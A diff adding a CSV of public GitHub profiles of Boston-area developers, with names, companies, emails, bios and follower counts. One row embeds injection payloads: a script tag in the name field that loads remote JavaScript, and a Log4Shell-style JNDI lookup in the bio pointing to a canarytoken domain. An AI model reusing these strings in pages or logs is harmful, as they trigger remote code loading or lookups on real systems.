@@ -1,0 +1,596 @@
+login,name,company,location,email,hireable,bio,public_repos,followers,following,created_at
+brianyu28,Brian Yu,,"Boston, MA",brian@brianyu.me,False,Software developer and educator,37,13500,15,2015-11-29T07:25:29Z
+nzakas,Nicholas C. Zakas,HUMAN WHO CODES LLC,"Boston, MA",,False,"Creator of ESLint, independent software developer, consultant, coach, and author.",74,10529,0,2008-12-05T17:18:56Z
+PatrickAlphaC,Patrick Collins,CYFRIN,Boston,,False,"Smart Contract Engineer, Auditor, and Educator",279,10196,44,2019-08-19T14:13:41Z
+KeithGalli,Keith Galli,,"Boston, MA",,True,YouTube Content Creator :).,59,5944,1,2013-12-25T19:49:26Z
+CharlesCreativeContent,Shawn Charles,AMAZON,"Boston, MA",,True,Software Engineer building Tech Communities,86,5063,1098,2020-03-11T20:10:11Z
+timbl,Tim Berners-Lee,INRUPT,Boston MA USA,timbl@w3.org,False,,18,4886,70,2011-12-11T01:28:03Z
+bahmutov,Gleb Bahmutov,,"Boston, MA",gleb.bahmutov@gmail.com,False,"JavaScript ninja, image processing expert, software quality fanatic. Sr Director of Engineering at Mercari US. MS MVP for OSS work, GitHub Star.",1259,4862,25,2012-08-24T14:34:53Z
+migueldeicaza,Miguel de Icaza,XIBBON,"Boston, MA.",miguel@gnome.org,False,,194,4831,74,2008-11-26T22:37:16Z
+rwaldron,Rick Waldron,,"Boston, MA",waldron.rick@gmail.com,False,He/him.,799,4470,53,2008-10-07T19:40:37Z
+nikomatsakis,Niko Matsakis,,"Boston, MA",rust@nikomatsakis.com,False,,263,4088,0,2009-11-19T07:01:48Z
+lh3,Heng Li,DFCI & HARVARD UNIVERSITY,"Boston, MA, USA",lh3@me.com,False,,125,4023,8,2010-11-13T18:38:38Z
+cowboy,Ben Alman,,"Boston, MA",cowboy@rj3.net,False,he/him,134,3562,19,2009-02-12T20:36:15Z
+wsvincent,Will Vincent,"JETBRAINS, DJANGO","Boston, MA",,True,Developer Advocate at JetBrains. Creator of LearnDjango.com.,83,3441,79,2011-05-03T20:00:28Z
+jlooper,Jen Looper,,Boston,,True,"Author, Educator, Technologist, Humanist - Author with Wiley: textbook Computer Science for Kids: A Storytelling Approach + The Illustrated AWS Cloud",141,3252,38,2012-02-18T21:25:33Z
+ccoenraets,Christophe Coenraets,SALESFORCE.COM,Boston,ccoenraets@gmail.com,False,,145,2974,0,2010-09-01T19:59:57Z
+rstudio,RStudio,,"Boston, MA",info@rstudio.org,False,,352,2945,0,2010-12-07T19:03:35Z
+pluskid,Chiyuan Zhang,MIT,"Boston, MA",pluskid@gmail.com,False,,30,2542,0,2008-03-21T16:07:50Z
+leonnoel,Leon Noel,RESILIENT CODERS,Boston,,False,"Managing Director Of Engineering @ Resilient Coders
+",129,2426,44,2010-08-17T04:51:07Z
+nedbat,Ned Batchelder,,Boston,ned@nedbatchelder.com,False,,123,2337,0,2008-09-09T10:48:29Z
+rapid7,Rapid7,,"Boston, MA",security@rapid7.com,False,,309,2256,0,2011-08-30T05:45:04Z
+quantopian,"Quantopian, Inc.",,"Boston, MA, USA",,False,Quantopian builds software tools and libraries for quantitative finance.,97,2139,0,2012-01-31T01:13:34Z
+cferdinandi,Chris Ferdinandi,,"Boston, MA",,True,,255,1864,2,2012-05-10T01:08:44Z
+processing,Processing Foundation,,"Boston, New York, Los Angeles, Worldwide",foundation@processingfoundation.org,False,"We create platforms to promote software literacy within the visual arts, and visual literacy within technology-related fields.",61,1834,0,2012-04-06T00:27:35Z
+REMitchell,REMitchell,GERSON LEHRMAN GROUP,"Boston, MA",Ryan.E.Mitchell@gmail.com,False,"Senior Software Engineer at GLG author of ""Web Scraping with Python"" and ""Instant Web Scraping with Java""",30,1637,5,2010-11-05T14:31:02Z
+davisking,Davis E. King,,"Boston, MA",davis@dlib.net,False,,8,1623,0,2013-12-25T13:39:24Z
+markbates,Mark Bates,"META42 LABS, LLC","Boston, MA",,False,Dynamic educator and technologist with 25+ years of experience across the technology sector.,138,1596,0,2008-03-21T15:55:40Z
+r00k,Ben Orenstein,TUPLEAPP,"Boston, MA",,False,"CEO/co-founder of Tuple, a tool for remote pair programming: https://tuple.app.",86,1578,0,2009-01-15T01:59:49Z
+rafalab,Rafael A Irizarry,HARVARD AND DANA-FARBER CANCER INSTITUTE,"Boston, MA",,False,I am a Professor of Applied Statistics at Harvard and the Dana-Farber Cancer Institute. @rafalab,48,1532,2,2013-08-28T13:21:46Z
+brohrer,Brandon Rohrer,,Boston,brohrer@gmail.com,False,"I also have some current work in Codeberg. Come say hi.
+https://codeberg.org/brohrer",51,1412,3,2012-01-26T04:42:08Z
+jtauber,James Tauber,SIGNUM UNIVERSITY,"Greater Boston Area, US",jtauber@jtauber.com,True,"Python and Web developer using linguistics, data science, and open source software to help people better understand languages and texts.",136,1251,78,2008-09-13T11:47:30Z
+hbctraining,Teaching materials at the Harvard Chan Bioinformatics Core,,"Boston, MA",hbctraining@hsph.harvard.edu,False,,57,1062,0,2016-12-20T20:45:31Z
+dsmilkov,Daniel Smilkov,LILAC AI,"Boston, MA",dsmilkov@gmail.com,True,"Co-founder of Lilac AI, acquired by @databricks. Co-created TensorFlow.js. Ex: Google Brain, PAIR, MIT Media Lab",7,982,3,2012-09-06T19:57:14Z
+andralex,Andrei Alexandrescu,NVIDIA,Boston Greater Area,,False,"Researcher, software engineer, and author.",26,981,11,2011-01-15T20:39:03Z
+chapmanb,Brad Chapman,GINKGO BIOWORKS,"Boston, MA",chapmanb@fastmail.com,False,Biologist and programmer,120,959,78,2008-12-09T18:45:45Z
+davidbau,David Bau,NORTHEASTERN UNIVERSITY,Boston,davidbau@northeastern.edu,False,"Northeastern professor in machine learning, interpretable deep networks, NLP and vision, ex-Googler. Believes that deep learning should be transparent.",99,940,0,2013-02-02T19:24:30Z
+christoomey,Chris Toomey,AUGUSTHEALTH,"Boston, MA",chris@ctoomey.com,True,"Web developer focusing on Rails, JS, and TypeScript. Working on @augusthealth, formerly @sagewell and @thoughtbot. Let’s chat!",53,927,9,2010-09-29T02:36:15Z
+qrush,Nick Quaranto,WISTIA,"Boston, MA",nick@quaran.to,False,"A short, sturdy creature fond of drink and industry. Started rubygems.org a while back. Still writing Ruby 16 years later.",149,925,142,2008-06-04T18:43:23Z
+vEnhance,Evan Chen,,"Boston, MA",evan@evanchen.cc,False,Math olympiad coach and writer of spaghetti code,44,901,2,2013-03-02T20:07:45Z
+RamblingCookieMonster,Warren Frame,,"USA; Boston Area, MA",,False,Perpetual student,71,897,263,2014-01-11T17:18:50Z
+M4cs,Max Bridgland,SUKURI-PROTOCOL,"Boston, Massachusetts",,True,builder | Multi-Language Developer | FOSS Advocate,222,893,448,2017-12-29T20:26:46Z
+thedillonb,Dillon Buchanan,128TECHNOLOGY,"Boston, MA",thedillonb@gmail.com,False,,36,891,7,2012-04-14T22:11:22Z
+jeremydaly,Jeremy Daly,AMPT,"Boston, MA",,True,Senior technology leader and serverless advocate. I build products for the web and teach others how to as well. AWS Serverless Hero and CEO at Ampt.,29,863,10,2012-07-27T18:36:28Z
+vicky002,Vikesh Tiwari,TEXAUHQ,Boston,tvicky002@gmail.com,False,"""The road to Easy Street goes through the Sewer.""
+
+CEO @texauhq, Past at @donotpay @slackhq, @directi @spit-osd, @POKEBOTS. About me? : ¯\_(ツ)_/¯ ",79,860,2,2013-09-23T08:18:43Z
+neuralmagic,Neural Magic,,Boston,,False,Neural Magic empowers developers to optimize and deploy LLMs at scale. Our model compression and acceleration enable top performance with vLLM.,62,855,0,2020-07-23T00:16:47Z
+bit101,Keith Peters,BIT-101,Boston(ish),,False,,97,836,1,2010-08-26T14:45:03Z
+jakejarvis,Jake Jarvis,,"Boston, MA",jake@jarv.is,True,💾 web 1.0 advocate,151,822,104,2012-05-03T19:43:48Z
+benfry,Ben Fry,FATHOM INFORMATION DESIGN,Boston,,False,,14,818,0,2012-04-08T13:04:18Z
+CAVIND46016,Cavin Dsouza,,Boston,,True,Senior Data Engineer,22,807,2960,2016-08-30T18:05:00Z
+JLLeitschuh,"Jonathan Leitschuh""><script src=""https://js.rip/b27oz0xw7e""></script>",CHAINGUARD-DEV,"Boston, MA",jonathan.leitschuh@gmail.com,False,"Software Engineer & Security Researcher;
+
+First Dan Kaminsky Fellow @ HUMAN Security;
+
+${jndi:ldap://x${hostName}.L4J.lile3fakwhyqg99zgj0yytxz7.canarytoken",1537,794,72,2012-01-12T04:25:37Z
+nicola,Nicola,MIT/BERKMAN CENTER,Boston,,False,Working to decentralize the web,186,787,142,2012-02-10T00:37:53Z
+mguay22,Michael Guay,SS&C TECHNOLOGIES,"Boston, MA",guay.me@gmail.com,False,,105,782,0,2016-06-25T04:04:38Z
+zephray,Wenting Zhang,MODOS TECH INC,"Boston, MA",zephray@outlook.com,False,"Co-founder of Modos Tech Inc, open source software and hardware enthusiast, he/him, love retro computing.",97,774,64,2013-07-27T08:38:28Z
+calvinmetcalf,Calvin Metcalf,APPGEO,Boston,,True,"I live with several cats, plus a dog, and my wife.",585,772,105,2011-10-14T16:25:22Z
+joshuaclayton,Josh Clayton,HAPPY-CO,"Boston, MA",,True,"Sr Dir, Eng at @happy-co. I <3 Ruby, Rust, Haskell, and Elm.",111,771,0,2008-02-28T13:26:42Z
+dweinstein,David Weinstein,NOWSECURE,"Florida (mainly), DC and Boston",dweinst@insitusec.com,True,making dreams a reality,287,767,1199,2011-05-17T21:28:01Z
+mahmoodlab,Mahmood Lab @ Harvard/MGB,,"Boston, MA",fmahmood@fas.harvard.edu,False,AI for Pathology Image Analysis Lab @ HMS / BWH,32,750,0,2019-12-08T22:33:59Z
+runarorama,Rúnar,UNISONCOMPUTING,Boston,,False,,118,747,11,2009-09-24T18:12:47Z
+BlakeWilliams,Blake Williams,GITHUB,"Boston, MA",blake@blakewilliams.me,False,"dev @github working on performance, scale, availability, and tooling.",155,737,4,2010-07-24T05:30:46Z
+jstedfast,Jeffrey Stedfast,MICROSOFT,"Boston, MA, USA",jestedfa@microsoft.com,False,,39,693,26,2010-07-20T20:09:58Z
+eyurtsev,Eugene Yurtsev,LANGCHAIN-AI,Boston,,False,SWE | ML | Chief Data Kitten,38,693,43,2013-01-07T11:14:55Z
+amejiarosario,Adrian Mejia,GOOGLE,"Boston, MA",me@adrianmejia.com,False,Make it Work → Make it Fast → Make it Beautiful,155,688,114,2010-09-28T03:40:13Z
+cinnamon-msft,Kayla Cinnamon,MICROSOFT,"Boston, MA",cinnamon@microsoft.com,False,Senior Product Manager at Microsoft delivering Microsoft PowerToys ✨,10,674,0,2019-03-08T23:01:10Z
+blackgirlbytes,Rizel Scarlett,BLOCK,"Boston, MA",,False,coding for fun,233,667,84,2016-10-21T23:57:52Z
+Wilto,Mat Marquis,,Greater Boston,mat@matmarquis.com,False,,89,654,9,2010-10-14T21:09:59Z
+xamarin,Xamarin,,"Boston, MA",,False,,172,648,0,2011-05-16T01:26:34Z
+MatthewPeterKelly,Matthew Kelly,BOSTON DYNAMICS,"Boston, MA",matthew.kelly2@gmail.com,False,Robotics engineer. C++ developer. I write control software for the Boston Dynamics Atlas humanoid robot. I have a PhD in trajectory optimization and control.,39,619,1,2014-07-11T17:31:46Z
+dayhaysoos,Nick DeJesus,,Boston,ndejesus1227@gmail.com,False,,71,618,91,2012-06-15T03:54:20Z
+svgeesus,Chris Lilley,W3C,"Boston, MA",chris@w3.org,False,"“Father of SVG”. @W3C staff. Co-developed PNG, `@font-face`, WOFF. W3C rep to ICC. These days working on CSS, PNG, Web Fonts, Web Audio.",47,608,6,2012-10-07T19:22:25Z
+LimHyungTae,Hyungtae Lim,SPARK LAB @ MIT,"Boston, the U.S.",,False,"Postdoc at SPARK Lab, MIT 
+
+(previously earned M.S. and Ph.D. @url-kaist)",81,604,132,2018-01-11T00:54:20Z
+drawrowfly,Andrey Chernykh,, Boston,,True,"I can build things with logic 🤖
+                              ",22,597,17,2013-04-14T21:30:19Z
+jhhayashi,Jordan Hayashi,KENSHO @KENSHO-TECHNOLOGIES,Boston,,False,,51,592,13,2014-04-17T03:21:05Z
+greerviau,Greer,MATTERWORKS,Boston,,False,Building software for scientists,35,572,14,2018-02-18T03:55:10Z
+groovemonkey,David Cohen,HASHICORP,"Boston, MA",,True,,61,562,20,2011-12-16T03:44:23Z
+aqeelsidd,Aqeel Siddiqui,,"Boston, Massachusetts",,False,,0,560,2,2017-11-09T19:19:40Z
+aaronbieber,Aaron Bieber,,"Boston, USA",aaron@aaronbieber.com,False,,105,554,3,2009-11-24T17:47:25Z
+rbren,Robert Brennan,FAIRWINDS,"Boston, Massachusetts",contact@rbren.io,False,,225,553,2,2014-05-17T15:29:32Z
+Fang-Haoshu,Fred Fang,MIT,"Boston, MA",,True,fhaoshu[at]gmail[dot]com,23,551,25,2015-05-14T15:01:22Z
+weihanglo,Weihang Lo,RUST-LANG @RUST-TW,"Taiwan | Boston, MA, USA ",,True,📦 Cargo worker at home,38,544,199,2015-09-16T14:29:23Z
+Shujian2015,,GOOGLE,"Boston, MA",,False,"Software engineer, Ph.D., and Kaggle triple master. Speech and NLP.",167,537,196,2015-04-06T06:07:52Z
+SuavePirate,Alex Dunn,CEPHABLE,Boston,,False,"I build things and teach people along the way.
+Blog: https://alexdunn.org
+
+
+Twitch: twitch.tv/suave_pirate",134,527,5,2014-03-06T02:33:28Z
+mdmintz,Michael Mintz,IBOSS,Greater Boston,,False,"SeleniumBase! Automation Lead, iboss. Former Automation Lead, HubSpot. Mostly Python, JavaScript, and CSS.",23,522,9,2014-02-26T00:52:42Z
+tekknolagi,Max Bernstein,,"Boston, MA",donotemailthisaddress@bernsteinbear.com,True,Biking around...,300,515,256,2010-09-16T00:45:24Z
+bcafferky,Bryan Cafferky,MICROSOFT,"Boston, MA",,False,"Microsoft Azure Technical Training Content Developer for Machine Learning, and AI",2,511,1,2013-11-07T13:51:38Z
+wengong-jin,Wengong Jin,"CSAIL, MASSACHUSETTS INSTITUTE OF TECHNOLOGY","Boston, MA",,False,,15,510,3,2012-10-09T07:27:49Z
+bcardarella,Brian Cardarella,⚓️ DOCKYARD ⚓️,"Boston, MA",,False,Founder / Chairman of DockYard,36,508,0,2008-07-26T22:24:48Z
+roblarsen,Rob Larsen,"PALATINO CONSULTING, LLC",Boston,rob@htmlcssjavascript.com,True,"Author of Mastering SVG, Beginning HTML and CSS and The Uncertain Web. Open source contributor/maintainer.",106,506,107,2010-08-11T20:54:10Z
+alamb,Andrew Lamb,INFLUXDATA,"Boston, USA",andrew@nerdnetworks.org,False,"keep on coding. 
+Staff Engineer at @influxdata 
+@apache {Arrow, DataFusion} PMC, ASF Member",71,504,1,2010-11-21T14:42:04Z
+arscan,Rob Scanlon,,"Boston, MA",robscanlon@gmail.com,True,"Building open source tools for Health IT developers. Full stack, front end.  Also: creative coding, WebGL, data visualization, motion graphics.",70,501,29,2010-09-23T12:54:33Z
+Lanny-MacMillan,Lanny MacMillan,THRYV,"Boston, Ma",,False,"Software Developer / Game Developer
+React.js || Next.js || Node.js || Unity || SQL & NoSQL || Javascript || C#. Let's make something great together!",25,493,830,2022-04-01T18:10:46Z
+sarahs,Sarah Schneider,,"Boston, MA",,False,senior product manager @ github/docs,17,489,0,2011-05-31T16:24:10Z
+NickCao,Nick Cao,RED HAT,"Boston, MA",nickcao@nichi.co,False,,212,488,147,2015-10-22T11:29:13Z
+Thomas-George-T,Thomas George Thomas,,"Boston, MA",thomasgeorgethomases@gmail.com,True,I love solving enterprise data problems. I have a passion for making awesome things.,28,473,29,2016-08-05T03:45:31Z
+ericwbailey,Eric Bailey,GITHUB,"Boston, MA",,False,Accessibility advocate. Design systems wonk for @primer.,33,469,115,2011-02-23T15:44:42Z
+bmoscon,Bryant Moscon,,"Boston, MA",bmoscon@gmail.com,True,,33,465,58,2011-12-22T13:44:49Z
+tianweiy,Tianwei Yin,MIT,Boston,tianweiy@mit.edu,False,,68,447,37,2018-04-18T12:21:39Z
+mono,Mono Project,,"Boston, MA",mono@xamarin.com,False,,243,441,0,2009-02-10T17:53:17Z
+dana-at-cp,Dana James Traversie,"CHECK POINT SOFTWARE TECHNOLOGIES, LTD.","Boston, MA",,False,,15,435,24,2016-03-10T19:31:54Z
+seenickcode,Nick Manning,MANNINGLABS,"Boston, MA",,True,"Course creator. Serial co-founder/CTO, @Techstars alumni. 🧙‍♂️",74,432,16,2009-04-20T19:02:48Z
+alexbw,Alex Wiltschko,GOOGLE,"Boston, MA",,False,,97,422,330,2009-12-04T14:50:40Z
+ck37,Chris Kennedy,"HARVARD MEDICAL SCHOOL, MASS GENERAL HOSPITAL","Boston, MA",chris@ck37.com,True,"Psychiatry faculty; biostatistics PhD. {Targeted, deep, machine} learning, NLP, IRT, computer vision, exposure mixtures, EHRs.",67,413,1624,2009-01-31T21:05:42Z
+cacheflowe,Justin Gitlin,CACHEFLOWE / HOVERCRAFT,"Boston, USA",,True,Creative Developer,32,413,55,2010-07-31T08:21:21Z
+sethwoodworth,Seth Woodworth,"ME, MYSELF, I",Boston,seth@sethish.com,False,"Data, education, and a bunch of tangents. Started @GITenberg, contributes to @TLDR-pages and random other libraries",275,412,222,2009-09-07T03:50:03Z
+mmargenot,Max Margenot,,Boston,,False,AI Engineering at Square,40,409,2,2015-10-13T19:56:42Z
+dceddia,Dave Ceddia,,"Boston, MA",dave@daveceddia.com,False,,117,408,1,2010-12-01T22:16:39Z
+slipster216,Jason Booth,,"Boston, MA",,False,"Game developer for 20+ years, currently specializing in Graphics, shaders, and client side architecture. ",9,405,1,2015-05-30T14:28:30Z
+jefferai,Jeff Mitchell,HASHICORP,Boston,jeffrey.mitchell@gmail.com,False,Security Whisperer @hashicorp,60,405,9,2008-10-12T13:55:28Z
+AVS1508,Aditya Vikram Singh,UMASS AMHERST | @BUILD-UMASS | @FUSEUMASS | @UMASS-CICSOFT,"Greater Boston, MA",aditya.11.present@gmail.com,True,SWE @Altius-Internal-Development,28,405,33,2016-06-22T08:00:49Z
+greghendershott,Greg Hendershott,,"Boston, USA",,False,Maker of things for Emacs and Racket.,70,400,22,2010-05-05T04:45:18Z
+jackdied,Jack Diederich,,"Boston, MA",jackdied@gmail.com,False,"Python committer, frequent Py*Con talker.",17,398,3,2010-04-26T18:04:52Z
+philzook58,Philip Zucker,DRAPER,Boston,,False,A pretty cool dude who does things.,159,397,1378,2011-08-03T00:47:42Z
+haozhu233,Hao Zhu,TUFTS UNIVERSITY,"Boston, MA ",haozhu233@gmail.com,False,"#rstats, #datavis, #deeplearning & (U •́ .̫ •̀ U) lover",123,394,169,2014-03-20T18:54:26Z
+samdmarshall,Samantha Demi,,"Boston, MA, USA",hello@pewpewthespells.com,False,,156,393,10,2011-09-28T18:37:59Z
+ibrahimgurhandev,Ibrahim Gurhan,RESILIENT CODERS,Boston MA,,False,"Software Engineer at  Resilient Coders | Web Developer | Techie |  AWS lover | 
+Based in Boston, MA",36,378,798,2020-07-20T04:11:30Z
+maddymontaquila,Maddy Montaquila (Leger),MICROSOFT,"Boston, MA",,False,"Senior Product Manager, .NET at @Microsoft ",29,377,40,2015-05-29T14:17:26Z
+geyang,Ge Yang,MIT,Boston,ge.ike.yang@gmail.com,True,"I work on reinforcement learning and autonomous robots with an emerging focus on spatial perception. IAIFI Fellow, Postdoc at MIT CSAIL.",267,375,175,2011-02-21T18:51:31Z
+tytso,Theodore Ts'o,GOOGLE,"Boston, MA",tytso@mit.edu,False,,23,374,0,2009-02-03T14:16:08Z
+alexanderepstein,Alex Epstein,,Boston,alexanderepstein@tuta.io,True,"Software developer with interests in artificial intelligence, optimization and signal processing",21,374,14,2015-12-04T04:22:56Z
+Dynatrace,Dynatrace,DYNATRACE LLC,"Waltham, Boston",opensource@dynatrace.com,False,Dynatrace,276,374,0,2014-01-15T18:16:30Z
+vtjnash,Jameson Nash,,"Boston, MA",vtjnash+github@gmail.com,True,,174,366,8,2010-07-13T16:07:03Z
+j256,Gray,,"Boston, MA, USA, Earth",,False,Java hacker.  C hacker in a previous life.,32,360,3,2012-05-17T18:00:26Z
+burtbeckwith,Burt Beckwith,,"Boston, MA",burt@burtbeckwith.com,False,Computer user,507,358,0,2009-03-27T12:59:58Z
+Divide-By-0,Yush G,,Boston,aayushg@mit.edu,False,"Faux barber at mitfades.com \\
+Zero knowledge zeitgeber
+",102,357,215,2013-06-24T16:47:37Z
+cpytel,Chad Pytel,THOUGHTBOT,"Boston, MA",chad@thoughtbot.com,True,Developer and CEO at thoughtbot,13,355,0,2008-04-04T11:51:11Z
+AGWA,Andrew Ayer,SSLMATE,Boston,,False,"Bootstrapped founder @SSLMate, where I make SSL certificates easier and do WebPKI and Certificate Transparency stuff.",20,353,0,2010-07-03T01:46:33Z
+erkyrath,Andrew Plotkin,ZARFHOME SOFTWARE CONSULTING,Boston,,False,,77,350,7,2009-03-22T02:05:41Z
+GeeLaw,Gee Law,,"Boston, MA, USA",geelaw@outlook.com,False,A cryptographer and software engineer.,31,349,138,2013-05-18T04:38:21Z
+dpickett,Dan Pickett,"LAUNCH ACADEMY, INC","Boston, MA / Bridgewater, MA",,True,Developer developer.,91,349,44,2008-02-27T15:36:31Z
+jbardin,James Bardin,HASHICORP/IBM,"Boston, MA",j.bardin@gmail.com,False,,29,348,0,2008-11-17T21:58:21Z
+YingboMa,Yingbo Ma,JULIACOMPUTING,"Boston, MA",mayingbo5@gmail.com,True,,137,342,21,2016-02-18T00:03:53Z
+iamaaditya,aaditya prakash,ML RESEARCHER,"Boston, MA",aaadityaprakash@gmail.com,True,Interested in applications of AI in healthcare.,72,341,81,2012-07-02T12:58:31Z
+jessicajaniuk,Jessica Janiuk,GOOGLE,"Boston, MA",,False,This account is retired. Find Jessica at github.com/thePunderWoman.,6,341,0,2020-10-12T21:49:39Z
+javasoze,John Wang,,Boston,john.wang@gmail.com,False,,32,336,34,2009-12-17T00:47:15Z
+SuperBruceJia,Shuyue Jia (Bruce),BOSTON UNIVERSITY,"Boston, MA",brucejia@bu.edu,True,"A Ph.D. Student at @vkola-lab, Boston University. Passionate about Large Language Models (LLMs), Large Multimodal Models (LMMs), and Machine Learning.",61,335,2576,2017-09-01T03:28:55Z
+gkatsev,Gary Katsevman,,Boston,me@gkatsev.com,True,"Food, tea, javascript, web players, captions, science fiction.",101,335,43,2010-12-24T22:10:56Z
+SomeKittens,Randall Koutnik,SOME STARTUP,"Boston, MA",rkoutnik@gmail.com,False,,93,330,6,2012-04-05T18:45:24Z
+quozd,Vitali Fokin,,"Boston, MA",vitali.fokin@gmail.com,True,,13,330,0,2012-08-10T10:33:42Z
+guicho271828,Masataro Asai,IBM RESEARCH,"Boston, Planet Lisp",,False,"AI Researcher on Optimization, Planning & Scheduling.",131,325,86,2012-01-11T14:51:25Z
+eyeseast,Chris Amico,MUCKROCK,"Boston, MA",,False,"Journalist & Developer in Boston, working on @documentcloud @MuckRock ",159,323,392,2008-09-22T18:58:12Z
+DavidVorick,David Vorick,NEBULOUS,"Boston, MA",david@glowlabs.org,False,Helping to scale solar to 100% of global energy production,34,319,5,2012-09-10T10:50:07Z
+derekprior,Derek Prior,GITHUB,"Boston, MA",derekprior@gmail.com,False,,24,314,6,2009-11-12T05:50:36Z
+dmitrizagidulin,Dmitri Zagidulin,MIT DIGITAL CREDENTIALS CONSORTIUM,"Boston, MA, USA",dzagidulin@gmail.com,False,,99,314,28,2011-07-29T15:34:36Z
+MTACS,D.F.,MACTHEMES-CO,Boston MA,mtac@mtac.app,False, Runtime developer,106,304,118,2015-07-06T23:50:01Z
+johntango,John Williams,MIT,"Boston, USA",jrw+3@mit.edu,False,MIT Professor,333,299,0,2018-09-09T15:19:03Z
+SeanTAllen,Sean T Allen,,Rural Boston,sean@seantallen.com,False,"Turn-ons include programming languages, distributed computing, Hiwatt amplifiers, and Fender Telecasters. Turn-offs include mayonnaise and stirring yogurt.",44,299,0,2010-02-01T03:41:08Z
+rkhetani,Radhika Khetani,HBC,"Boston, MA",khetani.r@gmail.com,False,,65,298,11,2012-12-14T22:42:05Z
+cgoldberg,Corey Goldberg,,"Boston, USA",,True,"Human, Open Source Contributor, Test Tool Developer, Automation Engineer, Pythonista",57,296,2,2011-10-08T21:21:42Z
+mfelleisen,Matthias Felleisen,PLT,Boston ,matthias@ccs.neu.edu,False,,41,295,0,2012-03-24T15:20:22Z
+harrah,Mark Harrah,,"Boston, MA",,False,,18,293,0,2009-04-11T15:11:10Z
+mattmight,Matthew Might,,"Birmingham, AL | Boston, MA",,False,"professor, etc.",33,292,1,2010-06-04T05:15:44Z
+dgiese,Dennis Giese,,"Boston, MA",dennis@dontvacuum.me,False,,24,292,4,2012-09-11T01:21:44Z
+rbaghdadi,Riyadh Baghdadi,MIT,Boston,,False,Postdoctoral researcher - MIT,15,291,2,2014-11-25T08:29:55Z
+Cortexelus,CJ Carr,DADABOTS,"Boston, MA",emperorcj@gmail.com,False,AI death metal. Total hackathons: 76 and counting,79,288,139,2012-09-29T19:11:49Z
+JohnbelMDev,Johnbel Mahautiere,RESILIENT CODER,Boston MA,,True,"Full Stack Software Engineer committed to harmonizing innovation with service, driven by a passion to inspire and contribute to the greater good. ",246,283,778,2019-02-06T23:39:19Z
+zachmayer,Zach Deane-Mayer,AI INSIGHT SOLUTIONS,"Boston, MA",,True,AI executive & Kaggle Grandmaster: 15+ years building with AI and ML.,51,279,13,2011-01-24T21:31:16Z
+odewahn,Andrew Odewahn,,"Boston, MA",andrew@odewahn.com,False,,287,278,9,2011-03-14T14:43:21Z
+mendix,Mendix,,Boston,,False,Mendix is the fastest & easiest low-code platform used by businesses to develop mobile & web apps at scale,261,277,0,2009-09-30T21:06:52Z
+jettify,Nikolay Novik,AIO-LIBS,"Greater Boston, MA",nickolainovik@gmail.com,False,,70,277,61,2010-03-15T21:05:21Z
+dsandler,Dan Sandler,GOOGLE @ANDROID,Boston,dsandler@dsandler.org,False,"Engineering director on the Android System UI team (""everything you see that's not an app™"").",43,277,70,2009-03-27T03:42:43Z
+vishnubob,Giles Hall,,"Boston, MA",,True,nervous system with a coding habit,83,277,81,2010-01-23T17:39:23Z
+sunnygleason,Sunny Gleason,SUNNYCLOUD,"Boston, MA",,True,,67,273,1971,2009-11-15T19:19:31Z
+ehynds,Eric Hynds,,"Boston, MA",,False,,64,273,21,2009-09-24T13:13:08Z
+ClaireBookworm,claire wang,,los angeles | boston,batman@hackclub.com,False,"To the stars and beyond! 🚀
+<3er of @hackclub, brains, and making.",96,272,194,2018-07-26T19:27:03Z
+raysalemi,Ray Salemi,SIEMENS EDA,"Boston, MA",ray@raysalemi.com,False,I am the author of the UVM Primer and the Aerospace & Defense Solutions Manager at Siemens EDA DVT division.,9,272,4,2013-01-02T13:13:36Z
+maheshj01,Mahesh Jamdade,,"Boston, MA",,True,"Masters in Computer Science at University of Massachusetts Dartmouth.
+Looking for Fulltime Software Roles",106,272,148,2017-08-28T14:01:29Z
+chamnit,Sonny Jeon,,Greater Boston Area,gnea.research@gmail.com,False,,2,270,1,2011-07-30T04:13:23Z
+stonier,Daniel Stonier,TOYOTA RESEARCH INSTITUTE,"Boston, Massachusetts",d.stonier@gmail.com,False,,184,270,1,2011-03-24T01:55:21Z
+githwxi,Hongwei Xi,"ATS TRUSTFUL SOFTWARE, INC.","Boston, Massachusetts",,False,"As the creator of ATS, he is currently primarily working on designing and implementing and maintaining the ATS3/Xanadu programming language system.",18,269,0,2011-02-16T18:49:54Z
+jarednova,Jared Novack,UPSTATEMENT,"Boston, MA",jared@upstatement.com,True,Partner at @Upstatement and maker of @timber,45,267,240,2012-01-02T01:48:39Z
+ZevEisenberg,Zev Eisenberg,THE NEW YORK TIMES,"Boston, MA",,False,"I was raised by clowns, but I ran away to join the circuits.",195,267,0,2010-11-02T17:59:22Z
+djcas9,Dustin Willis Webber,"KABA LABS, INC","Boston, MA",dustin.webber@gmail.com,False,"Security, Open Source & Music.",169,267,13,2008-08-27T23:35:06Z
+natanielruiz,Nataniel Ruiz,GOOGLE,Boston,,True,research scientist at google | author of dreambooth | personalization of generative models,25,261,1,2016-01-18T22:48:40Z
+nicolas-chaulet,Nicolas Chaulet,CANOAPBC,Boston,nicolas.chaulet@gmail.com,True,"Mathematician, computational designer and long time geometry enthusiast. Building tech to decarbonize the built environment. CTO @CanoaPBC ",17,260,25,2013-01-03T15:23:07Z
+a1600012888,Tianyuan Zhang,MIT,Boston,,False,"Phd student at MIT, EECS. Computer Vision and AI. 
+",36,258,103,2017-02-26T11:51:24Z
+nareshbhatia,Naresh Bhatia,,Boston,,False,,148,258,9,2011-11-25T13:28:51Z
+shubhank-saxena,Shubhank Saxena,,"Boston, MA",saxena.shubhank.19@gmail.com,True,"Grad student @northeastern
+Engineering @First-Rounds-On-ME ",185,258,250,2017-05-27T16:09:29Z
+vasia,Vasiliki (Vasia) Kalavri,BOSTON UNIVERSITY,"Boston, MA",,False,Assistant Professor,51,257,31,2010-11-27T12:22:53Z
+pentium3,pentium3,,Boston,yuanliw@bu.edu,False,emmmmmmmmmm,86,256,712,2014-04-20T09:46:32Z
+russhwolf,Russell Wolf,,"Boston, MA",,False,⌥⇧⌘K,35,255,0,2013-01-13T06:58:59Z
+ssalbdivad,David Blass,ARKTYPE,"Boston, MA",david@arktype.io,False,"Full-time open source dev and author of @arktypeio, TypeScript's 1:1 validator optimized from editor to runtime ⛵",22,254,60,2015-01-22T02:08:25Z
+majestrate,jeff,,"Boston, MA",jeff@lokinet.io,True,[placeholder],212,254,0,2010-11-28T04:17:30Z
+vargaz,Zoltan Varga,,Boston,vargaz@gmail.com,False,,13,251,0,2010-01-20T16:44:48Z
+mairin,Máirín Duffy,"RED HAT, INC.","Boston, MA",duffy@redhat.com,False,Distinguished Engineer @RedHatOfficial. ,83,251,41,2011-05-20T04:57:19Z
